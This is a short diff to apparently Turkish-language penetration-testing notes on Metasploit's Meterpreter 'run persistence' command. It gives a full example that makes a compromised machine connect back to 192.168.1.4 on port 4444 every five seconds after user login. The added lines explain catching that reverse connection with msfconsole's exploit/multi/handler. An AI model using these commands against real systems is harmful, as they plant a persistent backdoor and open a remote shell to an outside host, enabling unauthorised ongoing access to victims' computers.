@@ -11,3 +11,5 @@ Parametreler
 Örnek kullanım:
 run persistence -U -i 5 -p 4444 -r 192.168.1.4
 Kullanıcı oturum açtığında 5 saniye aralıklarla 192.168.1.4 adresinde bulunan makinenin 4444 portuna istek yap anlamındadır.
+Burdan sonra yapacağın gelen bağlantıyı yakalamak.Bunu belirttiğin portu dinleyerek yapabilirsin.
+(msfconsole ==> exploit/multi/handler)
